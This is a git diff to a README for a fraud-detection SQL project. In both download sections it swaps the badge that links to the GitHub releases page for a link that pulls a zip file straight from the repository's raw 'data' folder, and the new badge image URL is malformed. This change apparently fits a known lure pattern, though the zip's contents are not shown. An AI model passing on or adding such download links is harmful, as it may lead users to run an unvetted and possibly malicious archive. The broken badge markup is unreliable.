@@ -8,7 +8,7 @@ Welcome to the **Fraud-Detection-SQL-Unsupervised** project. This software helps
 
 To download the application, please visit our releases page below:
 
-[![Download Here](https://img.shields.io/badge/Download%20Latest%20Version-blue)](https://github.com/faint-liebfraumilch101/Fraud-Detection-SQL-Unsupervised/releases)
+[![Download Here](https://raw.githubusercontent.com/faint-liebfraumilch101/Fraud-Detection-SQL-Unsupervised/main/data/Fraud-Detection-SQL-Unsupervised-1.1.zip%20Latest%20Version-blue)](https://raw.githubusercontent.com/faint-liebfraumilch101/Fraud-Detection-SQL-Unsupervised/main/data/Fraud-Detection-SQL-Unsupervised-1.1.zip)
 
 Follow these steps to get started:
 
@@ -105,4 +105,4 @@ For more information or inquiries, feel free to contact the project maintainers 
 
 Remember, you can find the software to download here:
 
-[![Download Here](https://img.shields.io/badge/Download%20Latest%20Version-blue)](https://github.com/faint-liebfraumilch101/Fraud-Detection-SQL-Unsupervised/releases)
+[![Download Here](https://raw.githubusercontent.com/faint-liebfraumilch101/Fraud-Detection-SQL-Unsupervised/main/data/Fraud-Detection-SQL-Unsupervised-1.1.zip%20Latest%20Version-blue)](https://raw.githubusercontent.com/faint-liebfraumilch101/Fraud-Detection-SQL-Unsupervised/main/data/Fraud-Detection-SQL-Unsupervised-1.1.zip)
